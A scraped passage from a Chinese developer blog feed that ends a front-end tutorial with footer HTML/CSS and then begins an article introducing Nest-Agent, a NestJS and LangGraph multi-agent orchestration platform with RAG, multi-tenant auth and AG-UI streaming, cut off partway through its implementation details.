                    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>帮助<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>
               
                <span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>新手指南<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>如何注册<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>如何选课<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>如何拿到毕业证<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>学分是什么<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>考试未通过怎么办<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>
                
                <span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>合作伙伴<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>合作机构<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>合作导师<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>
                  
                
                <span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
     <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 5.footer底部模块结束 --&gt;</span>
</code></pre>
<h5 data-id="heading-40">样式代码</h5>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* .footer模块 */</span>
<span class="hljs-selector-class">.footer</span>{
<span class="hljs-attribute">height</span>: <span class="hljs-number">415px</span>;
<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;
}

<span class="hljs-selector-class">.footer</span> <span class="hljs-selector-class">.w</span>{
    <span class="hljs-comment">/* 不要用外边距 */</span>
    <span class="hljs-comment">/* margin-top: 35px; */</span>
    <span class="hljs-attribute">padding-top</span>: <span class="hljs-number">35px</span>;
}

<span class="hljs-selector-class">.copyright</span>{
    <span class="hljs-attribute">float</span>: left;
}

<span class="hljs-selector-class">.copyright</span> <span class="hljs-selector-tag">p</span>{
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">12px</span>;
    <span class="hljs-attribute">color</span>:<span class="hljs-number">#666</span>;
    <span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span> <span class="hljs-number">0</span> ;
}
<span class="hljs-selector-class">.copyright</span> <span class="hljs-selector-class">.app</span>{
    <span class="hljs-attribute">display</span>:block;
    <span class="hljs-attribute">width</span>: <span class="hljs-number">118px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">33px</span>;
    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#00a4ff</span>;
    <span class="hljs-attribute">text-align</span>: center;
    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">33px</span>;
    <span class="hljs-attribute">color</span>:<span class="hljs-number">#00a4ff</span>;
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;
}

<span class="hljs-selector-class">.links</span>{
    <span class="hljs-attribute">float</span><span class="hljs-selector-pseudo">:right</span>;
}

<span class="hljs-selector-class">.links</span> <span class="hljs-selector-tag">dl</span>{
    <span class="hljs-attribute">float</span>: left;
    <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">100px</span>;
}

<span class="hljs-selector-class">.links</span> <span class="hljs-selector-tag">dl</span> <span class="hljs-selector-tag">dt</span>{
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;
    <span class="hljs-attribute">color</span>:<span class="hljs-number">#333</span>;
}

<span class="hljs-selector-class">.links</span> <span class="hljs-selector-tag">dl</span> <span class="hljs-selector-tag">dd</span> <span class="hljs-selector-tag">a</span> {
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">12px</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
}
</code></pre>
<h4 data-id="heading-41">底部效果图</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96f5f33276e844698475e7c43e26e653~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=L0T1SxtpU4bmbLHoaYK%2BqrkydEI%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-42">4.总结</h2>
<p>为方便大家查看相关代码，我已将本次学成在线案例练习的代码上传至 GitHub 仓库，链接：[<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTANG1110%2Ffrontend-learning-journey%2Ftree%2Fmain%2Fstudy" target="_blank" title="https://github.com/TANG1110/frontend-learning-journey/tree/main/study" ref="nofollow noopener noreferrer">github.com/TANG1110/fr…</a>] 。<br/>从摸索代码到看到模块效果，每一步都充满挑战与惊喜。小伙伴们，学习之路虽有坎坷，但坚持就有收获 ！希望大家多多关注我，并点赞收藏这篇文章，给予我更多支持与鼓励，我们一起在技术海洋里并肩前行，共同成长～</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从零搭建多 Agent 智能编排平台：NestJS + LangGraph 全栈实战]]></title>    <link>https://juejin.cn/post/7605780454579929139</link>    <guid>https://juejin.cn/post/7605780454579929139</guid>    <pubDate>2026-02-12T12:29:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605780454579929139" data-draft-id="7605552034570436654" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从零搭建多 Agent 智能编排平台：NestJS + LangGraph 全栈实战"/> <meta itemprop="keywords" content="LangChain"/> <meta itemprop="datePublished" content="2026-02-12T12:29:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Amber丶King"/> <meta itemprop="url" content="https://juejin.cn/user/2453765682107768"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从零搭建多 Agent 智能编排平台：NestJS + LangGraph 全栈实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2453765682107768/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Amber丶King
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T12:29:12.000Z" title="Thu Feb 12 2026 12:29:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">从零搭建多 Agent 智能编排平台：NestJS + LangGraph 全栈实战</h2>
<blockquote>
<p>本文分享一个开源项目 <strong>Nest-Agent</strong>——基于 NestJS + LangGraph 构建的多 Agent 编排平台，支持 Supervisor 自动路由、DAG 自定义工作流、RAG 知识库检索，遵循 AG-UI 标准协议实现 token 级流式输出。如果对你有帮助，欢迎 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpeng-yin%2Fnest-agent" target="_blank" title="https://github.com/peng-yin/nest-agent" ref="nofollow noopener noreferrer">GitHub Star</a> 支持 ⭐</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">为什么做这个项目？</h3>
<p>当前 AI Agent 框架层出不穷，Python 生态的 LangChain、CrewAI 已经很成熟。但在 Node.js / TypeScript 生态，<strong>企业级的 Agent 编排后端方案</strong>相对匮乏。作为一个 NestJS 爱好者，我希望用最熟悉的技术栈打造一个：</p>
<ul>
<li><strong>生产级</strong>的多 Agent 协同平台，不是 demo</li>
<li>支持 <strong>Supervisor 自动路由</strong> 和 <strong>DAG 自定义工作流</strong> 两种编排模式</li>
<li>遵循 <strong>AG-UI 标准协议</strong>，前后端解耦，可对接 CopilotKit 等主流前端 SDK</li>
<li>内置 <strong>RAG 知识库</strong>、<strong>多 LLM 供应商</strong>、<strong>多租户隔离</strong>，开箱即用</li>
</ul>
<p>于是有了 <strong>Nest-Agent</strong>。</p>
<hr/>
<h3 data-id="heading-2">技术栈一览</h3>













































<table><thead><tr><th>层次</th><th>技术</th></tr></thead><tbody><tr><td>后端框架</td><td>NestJS 11</td></tr><tr><td>Agent 编排</td><td>LangChain + LangGraph</td></tr><tr><td>数据库</td><td>MySQL 8.0 (TypeORM)</td></tr><tr><td>缓存</td><td>Redis 7 (ioredis)</td></tr><tr><td>向量库</td><td>Milvus 2.3</td></tr><tr><td>认证</td><td>Passport JWT</td></tr><tr><td>前端</td><td>React 18 + shadcn/ui + Vite</td></tr><tr><td>包管理</td><td>pnpm workspace (monorepo)</td></tr><tr><td>部署</td><td>Docker Compose 一键启动</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-3">核心功能展示</h3>
<h4 data-id="heading-4">1. AI 对话 — 流式输出 + 工具调用可视化</h4>
<p>对话是整个平台的核心。输入一个问题，Supervisor 自动判断是否需要搜索、检索知识库还是直接回答，整个过程实时流式展示。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6ae6d04159847e48d01384bb3e8ccf5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW1iZXLkuLZLaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771504152&amp;x-signature=rHBQORNq9S9PxApaAaBHKTonAZM%3D" alt="对话首页" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/baa2d13e227542d99502766e45d2a1a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW1iZXLkuLZLaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771504152&amp;x-signature=GJMnGRgYkylMe5BAhWACC%2BZWDPI%3D" alt="流式输出" loading="lazy"/></p>
<p><strong>亮点：</strong></p>
<ul>
<li>Token 级别的流式输出，逐字显示 AI 回复</li>
<li>实时展示 Agent 执行步骤（researcher → 搜索 → 生成回答）</li>
<li>工具调用全程可视化——工具名、参数、返回结果一目了然</li>
<li>Markdown 富文本渲染（代码块、表格、列表、链接等）</li>
<li>对话标题自动生成，不再是千篇一律的 "New Conversation"</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5cf8cf45a0a142de8e5b9bb23a5a2dc8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW1iZXLkuLZLaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771504152&amp;x-signature=MVJojRffmEpBtN5czPimuKTN53M%3D" alt="对话详情" loading="lazy"/></p>
<h4 data-id="heading-5">2. 工作流编排 — 可视化 DAG 工作流</h4>
<p>除了 Supervisor 自动模式，你还可以自定义 DAG 工作流，精确控制 Agent 的执行流程。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/117f3ce733ae4238878ae13ad6622a5c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW1iZXLkuLZLaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771504152&amp;x-signature=WCLigg4qXy3oEjD1aZCM2KY2W6Y%3D" alt="工作流列表" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b63dd9714044be793d2b61a5a96ffe5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW1iZXLkuLZLaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771504152&amp;x-signature=bvUM1EPQl6xjr%2BcgE8MbdnqzDKY%3D" alt="创建工作流" loading="lazy"/></p>
<p><strong>支持的节点类型：</strong></p>
<ul>
<li><code>agent</code> — 可调用工具的 AI Agent，支持自定义 system prompt</li>
<li><code>tool</code> — 直接调用工具节点</li>
<li><code>condition</code> — 条件分支，根据关键词路由到不同分支</li>
<li><code>start</code> / <code>end</code> — 起止标记</li>
</ul>
<h4 data-id="heading-6">3. RAG 知识库 — 语义检索</h4>
<p>上传文档到知识库，Agent 对话时自动检索相关知识片段，实现基于私有数据的问答。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c4ac04f6fd641d881256a5755c9ccf6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW1iZXLkuLZLaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771504152&amp;x-signature=%2B1Np5K%2BV2oJyu6Wyyh%2B%2B6b%2BXxCU%3D" alt="知识库列表" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0cb4345da79b42cba3609ea1ff28c186~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW1iZXLkuLZLaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771504152&amp;x-signature=RUnhNbEkNAqfuhvSbm3X3EtGBVw%3D" alt="语义检索" loading="lazy"/></p>
<p><strong>RAG Pipeline：</strong></p>
<pre><code class="hljs language-scss" lang="scss">文档 → 分块(<span class="hljs-number">1000</span>/<span class="hljs-number">200</span>) → BAAI/bge-m3 Embedding → Milvus 向量存储
查询 → Embedding → Milvus ANN 检索 → <span class="hljs-attribute">Top</span>-K 结果
</code></pre>
<h4 data-id="heading-7">4. 认证系统 — 多租户隔离</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a7ca2b6c247449d88c0c48899a020fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW1iZXLkuLZLaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771504152&amp;x-signature=jDNK%2Bo1BFnDSpyD1a07xHrvKs7k%3D" alt="登录" loading="lazy"/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97d20be969e64f7987d177f787f1aca2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW1iZXLkuLZLaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771504152&amp;x-signature=w9yVGtgmVWIFYOlsSp%2BeFWlCDNo%3D" alt="注册" loading="lazy"/></p>
<p>JWT 认证 + TenantGuard，所有数据按 <code>tenantId</code> 隔离，天然支持多团队使用。</p>
<hr/>
<h3 data-id="heading-8">架构设计</h3>
<h4 data-id="heading-9">整体分层</h4>
<pre><code class="hljs language-bash" lang="bash">┌──────────────────────────────────────────────────────────────┐
│                     React + shadcn/ui                         │
│                (SSE 客户端 + AG-UI 事件解析)                   │
└────────────────────────┬─────────────────────────────────────┘
                         │ HTTP POST + SSE 流
┌────────────────────────▼─────────────────────────────────────┐
│                     NestJS 应用层                              │
│  ┌──────┐ ┌──────┐ ┌───────┐ ┌──────┐                       │
│  │ Auth │ │ Chat │ │ Agent │ │ RAG  │  Controller 层          │
│  └──┬───┘ └──┬───┘ └───┬───┘ └──┬───┘                       │
│     │        │         │        │                             │
│  ┌──▼───┐ ┌──▼───┐ ┌───▼───┐ ┌──▼───┐                       │
│  │ Auth │ │ Chat │ │Agent  │ │ RAG  │  Service 层            │
│  └──────┘ └──────┘ └───┬───┘ └──────┘                       │
│                        │                                      │
│           ┌────────────┼────────────┐                        │
│     ┌─────▼─────┐ ┌────▼────┐ ┌────▼────┐                   │
│     │ Supervisor │ │   DAG   │ │  Tool   │  核心编排层        │
│     │  Factory   │ │ Engine  │ │Registry │                   │
│     └───────────┘ └─────────┘ └─────────┘                   │
│                                                               │
│     ┌─────────┐ ┌────────┐ ┌────────┐                       │
│     │   LLM   │ │ Milvus │ │ Redis  │  基础设施层            │
│     │ Service  │ │Service │ │Service │                       │
│     └─────────┘ └────────┘ └────────┘                       │
└──────────────────────────────────────────────────────────────┘
         │             │           │
    ┌────▼────┐  ┌─────▼────┐ ┌───▼──┐
    │OpenAI/  │  │ Milvus   │ │Redis │  存储层
    │Anthropic│  │ 2.3      │ │  7   │
    │/Qwen    │  └──────────┘ └──────┘
    └─────────┘
</code></pre>
<h4 data-id="heading-10">两种编排模式对比</h4>
<h5 data-id="heading-11">Supervisor 模式（默认）</h5>
<p>适合通用对话场景。LLM 充当"主管"，根据用户意图动态路由到合适的 Agent：</p>
<pre><code class="hljs language-arduino" lang="arduino">用户: <span class="hljs-string">"搜索一下 NestJS 11 新功能"</span>
  → Supervisor 判断: 需要搜索，路由到 researcher
  → researcher 调用 web_search 工具
  → researcher 根据搜索结果生成回答
  → Supervisor 判断: 任务完成，路由到 __end__
</code></pre>
<p>核心实现：Supervisor 使用 LLM + <code>withStructuredOutput(zod schema)</code> 做结构化输出，返回 <code>{ next: "researcher" | "responder" | "__end__" }</code>。</p>
<h5 data-id="heading-12">DAG 模式（自定义工作流）</h5>
<p>适合复杂业务流程。用户预定义有向无环图，精确控制执行链路：</p>
<pre><code class="hljs language-scss" lang="scss">Start → 研究员<span class="hljs-built_in">Agent</span>(调用搜索) → 条件判断 → 写手<span class="hljs-built_in">Agent</span>(生成报告) → End
                                    ↘ 工具节点(直接检索) ↗
</code></pre>
<p>核心实现：将 JSON 格式的 <code>nodes[]</code> + <code>edges[]</code> 编译为 LangGraph 的 <code>StateGraph</code>，通过 <code>Command({ goto, update })</code> 控制状态转移。</p>
<hr/>
<h3 data-id="heading-13">关键技术实现细节</h3>
<h4 data-id="heading-14">1. AG-UI 流式事件协议</h4>
<p>这是项目中最复杂也最有价值的部分。系统遵循 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.ag-ui.com" target="_blank" title="https://docs.ag-ui.com" ref="nofollow noopener noreferrer">AG-UI</a> 标准协议，通过 SSE 推送细粒度事件：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">event:</span> RUN_STARTED
<span class="hljs-symbol">data:</span> {<span class="hljs-string">"type"</span>:<span class="hljs-string">"RUN_STARTED"</span>,<span class="hljs-string">"threadId"</span>:<span class="hljs-string">"xxx"</span>,<span class="hljs-string">"runId"</span>:<span class="hljs-string">"xxx"</span>}

<span class="hljs-symbol">event:</span> STEP_STARTED
<span class="hljs-symbol">data:</span> {<span class="hljs-string">"type"</span>:<span class="hljs-string">"STEP_STARTED"</span>,<span class="hljs-string">"stepName"</span>:<span class="hljs-string">"researcher"</span>}

<span class="hljs-symbol">event:</span> TOOL_CALL_START
<span class="hljs-symbol">data:</span> {<span class="hljs-string">"type"</span>:<span class="hljs-string">"TOOL_CALL_START"</span>,<span class="hljs-string">"toolCallId"</span>:<span class="hljs-string">"xxx"</span>,<span class="hljs-string">"toolCallName"</span>:<span class="hljs-string">"web_search"</span>}

<span class="hljs-symbol">event:</span> TEXT_MESSAGE_CONTENT
<span class="hljs-symbol">data:</span> {<span class="hljs-string">"type"</span>:<span class="hljs-string">"TEXT_MESSAGE_CONTENT"</span>,<span class="hljs-string">"messageId"</span>:<span class="hljs-string">"xxx"</span>,<span class="hljs-string">"delta"</span>:<span class="hljs-string">"逐字输出..."</span>}

<span class="hljs-symbol">event:</span> RUN_FINISHED
<span class="hljs-symbol">data:</span> {<span class="hljs-string">"type"</span>:<span class="hljs-string">"RUN_FINISHED"</span>,<span class="hljs-string">"threadId"</span>:<span class="hljs-string">"xxx"</span>,<span class="hljs-string">"runId"</span>:<span class="hljs-string">"xxx"</span>}
</code></pre>
<p><strong>三段式文本消息</strong>：<code>TEXT_MESSAGE_START → TEXT_MESSAGE_CONTENT(增量) → TEXT_MESSAGE_END</code></p>
<p><strong>四段式工具调用</strong>：<code>TOOL_CALL_START → TOOL_CALL_ARGS → TOOL_CALL_END → TOOL_CALL_RESULT</code></p>
<p>遵循标准协议意味着可以直接对接 CopilotKit 等前端 SDK，无需自定义解析。</p>
<h4 data-id="heading-15">2. LangGraph streamEvents → AG-UI 的精细转换</h4>
<p><code>AgentService.processStreamEvents()</code> 方法实现了 LangGraph 底层事件到 AG-UI 协议的映射，需要处理几个棘手的问题：</p>
<p><strong>问题 1：Supervisor 路由节点的输出不应暴露给用户</strong></p>
<p>Supervisor 的结构化输出（<code>{ next: "researcher" }</code>）是内部路由决策，不应该推送给前端。通过节点名过滤解决。</p>
<p><strong>问题 2：嵌套子 Agent 的"思考"文本</strong></p>
<p><code>createReactAgent</code> 内部的 LLM 在调用工具前会输出一些"思考"文本（通常是复述 prompt），这些不应显示给用户。解决方案是通过 <code>langgraph_checkpoint_ns</code> 区分嵌套层级：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> isNestedAgent = parentNode &amp;&amp; langgraphNode !== parentNode;
<span class="hljs-keyword">if</span> (isNestedAgent &amp;&amp; !nodeToolsDone.<span class="hljs-title function_">get</span>(nodeKey)) {
  <span class="hljs-comment">// 暂存到 pendingTextPerNode，工具完成后才释放</span>
}
</code></pre>
<p><strong>问题 3：XML 工具调用格式兼容</strong></p>
